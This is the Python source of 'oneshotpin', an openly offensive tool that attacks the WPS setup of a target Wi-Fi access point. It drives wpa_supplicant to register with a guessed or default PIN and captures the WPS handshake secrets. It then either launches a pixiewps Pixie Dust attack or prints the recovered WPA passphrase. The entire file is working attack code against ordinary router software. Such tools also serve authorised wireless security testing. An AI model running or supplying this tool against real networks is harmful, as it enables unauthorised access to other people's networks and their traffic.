#!/usr/bin/env python2

import sys, subprocess, os, tempfile, shutil

class Data():
	def __init__(self):
		self.pke = ''
		self.pkr = ''
		self.e_hash1 = ''
		self.e_hash2 = ''
		self.authkey = ''
		self.e_nonce = ''
		self.wpa_psk = ''
		self.state = ''

class Options():
	def __init__(self):
		self.interface = None
		self.bssid = None
		self.pin = None
		self.pixiemode = False
		self.verbose = False
		self.showpixiecmd = False

def cprint(s):
	sys.stdout.write(s + '\n')
	sys.stdout.flush()

def shellcmd(cmd):
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)
	result = proc.read()
	proc.wait()
	return result

def run_wpa_supplicant(options):
	options.tempdir = tempfile.mkdtemp()
	with tempfile.NamedTemporaryFile(suffix='.conf', delete=False) as temp:
		temp.write("ctrl_interface=%s\nctrl_interface_group=root\nupdate_config=1\n"%(options.tempdir))
		options.tempconf=temp.name
	cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i%s -c%s'%(options.interface, options.tempconf)
	proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	return proc

def run_wpa_cli(options):
	cmd = 'wpa_cli -i%s -p%s'%(options.interface, options.tempdir)
	proc = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
	return proc

def recvuntil(pipe, what):
	s = ''
	while True:
		inp = pipe.stdout.read(1)
		if inp == '': return s
		s += inp
		if what in s: return s

def got_all_pixie_data(data):
	return data.pke and data.pkr and data.e_nonce and data.authkey and data.e_hash1 and data.e_hash2

def statechange(data, old, new):
	cprint('%s -> %s'%(old, new))
	data.state = new
	return True

def process_wpa_supplicant(pipe, options, data):
	def get_hex(line):
		a = line.split(':', 3)
		return a[2].replace(' ', '')

	line = pipe.stdout.readline()
	if line == '':
		pipe.wait()
		return False
	line = line.rstrip('\n')

	if options.verbose: sys.stderr.write(line + '\n')

	if line.startswith('WPS: '):
		if 'Enrollee Nonce' in line and 'hexdump' in line:
			data.e_nonce = get_hex(line)
			assert(len(data.e_nonce) == 16*2)
		elif 'DH own Public Key' in line and 'hexdump' in line:
			data.pkr = get_hex(line)
			assert(len(data.pkr) == 192*2)
		elif 'DH peer Public Key' in line and 'hexdump' in line:
			data.pke = get_hex(line)
			assert(len(data.pke) == 192*2)
		elif 'AuthKey' in line and 'hexdump' in line:
			data.authkey = get_hex(line)
			assert(len(data.authkey) == 32*2)
		elif 'E-Hash1' in line and 'hexdump' in line:
			data.e_hash1 = get_hex(line)
			assert(len(data.e_hash1) == 32*2)
		elif 'E-Hash2' in line and 'hexdump' in line:
			data.e_hash2 = get_hex(line)
			assert(len(data.e_hash2) == 32*2)
		elif 'Network Key' in line and 'hexdump' in line:
			data.wpa_psk = get_hex(line).decode('hex')
		elif 'Building Message M' in line:
			statechange(data, data.state, 'M' + line.split('Building Message M')[1])
		elif 'Received M' in line:
			statechange(data, data.state, 'M' + line.split('Received M')[1])

	elif ': State: ' in line:
		statechange(data, *line.split(': State: ')[1].split(' -> '))
	elif 'WPS-FAIL' in line:
		cprint("WPS-FAIL :(")
		return False

	elif 'NL80211_CMD_DEL_STATION' in line:
		#if data.state == 'ASSOCIATED':
		#	print "URGH"
		cprint("[ERROR]: unexpected interference - kill NetworkManager/wpa_supplicant!")
		#return False
	elif 'Trying to authenticate with' in line:
		cprint(line)
	elif 'Authentication response' in line:
		cprint(line)
	elif 'Trying to associate with' in line:
		cprint(line)
	elif 'Associated with' in line:
		cprint(line)
	elif 'EAPOL: txStart' in line:
		cprint(line)

	return True

def die(msg):
	sys.stderr.write(msg + '\n')
	sys.exit(1)

def usage():
	die( \
"""
oneshotpin 0.0.2 (c) 2017 rofl0r

Required Arguments:
	-i, --interface=<wlan0>  Name of the interface to use
	-b, --bssid=<mac>        BSSID of the target AP

Optional Arguments:
	-p, --pin=<wps pin>      Use the specified pin (arbitrary string or 4/8 digit pin)
	-K, --pixie-dust         Run pixiedust attack
	-X                       Alway print pixiewps command
	-v                       Verbose output

Example:
	%s -i wlan0 -b 00:90:4C:C1:AC:21 -p 12345670 -K
""" % sys.argv[0])

def get_pixie_cmd(data):
	return "pixiewps --pke %s --pkr %s --e-hash1 %s --e-hash2 %s --authkey %s --e-nonce %s" % \
		(data.pke, data.pkr, data.e_hash1, data.e_hash2, data.authkey, data.e_nonce)

def cleanup(wpas, wpac, options):
	wpac.stdin.write('terminate\nquit\n')
	wpas.terminate()
	wpac.terminate()
	shutil.rmtree(options.tempdir, ignore_errors=True)
	os.remove(options.tempconf)

if __name__ == '__main__':
	options = Options()

	import getopt
	optlist, args = getopt.getopt(sys.argv[1:], ":e:i:b:p:XKv", ["help", "interface", "bssid", "pin", "pixie-dust"])
	for a,b in optlist:
		if   a in ('-i', "--interface"): options.interface = b
		elif a in ('-b', "--bssid"): options.bssid = b
		elif a in ('-p', "--pin"): options.pin = b
		elif a in ('-K', "--pixie-dust"): options.pixiemode = True
		elif a in ('-X'): options.showpixiecmd = True
		elif a in ('-v'): options.verbose = True
		elif a == '--help': usage()
	if not options.interface or not options.bssid:
		die("missing required argument! (use --help for usage)")
	if options.pin == None and not options.pixiemode:
		die("you need to supply a pin or enable pixiemode! (use --help for usage)")
	if options.pin == None and options.pixiemode:
		options.pin = '12345670'

	if os.getuid() != 0:
		die("oops, try as root")

	data = Data()
	wpas = run_wpa_supplicant(options)
	while True:
		s = recvuntil(wpas, '\n')
		if options.verbose: sys.stderr.write(s)
		if 'update_config=1' in s: break

	wpac = run_wpa_cli(options)
	recvuntil(wpac, '\n> ')
	wpac.stdin.write('wps_reg %s %s\n' % (options.bssid, options.pin))
#	while True:
#		sys.stderr.write( wpac.stdout.read(1) )
	recvuntil(wpac, 'OK')

	pixiecmd = None

	while True:
		try:
			res = process_wpa_supplicant(wpas, options, data)
		except KeyboardInterrupt:
			cprint("aborting...")
			res = False

		if not res: break

		if got_all_pixie_data(data):
			pixiecmd = get_pixie_cmd(data)

		if options.pixiemode and pixiecmd:
			cleanup(wpas, wpac, options)
			cprint("running %s" % pixiecmd)
			os.execlp('/bin/sh', '/bin/sh', '-c', pixiecmd)
			# shouldnt get here
			sys.exit(1)

		if data.wpa_psk:
			if options.showpixiecmd and pixiecmd: cprint(pixiecmd)
			cleanup(wpas, wpac, options)
			cprint("!!! GOT WPA KEY !!!: %s" % data.wpa_psk)
			sys.exit(0)

	cprint("hmm, seems something went wrong...")
	if options.showpixiecmd and pixiecmd: cprint(pixiecmd)
	cleanup(wpas, wpac, options)
	sys.exit(1)
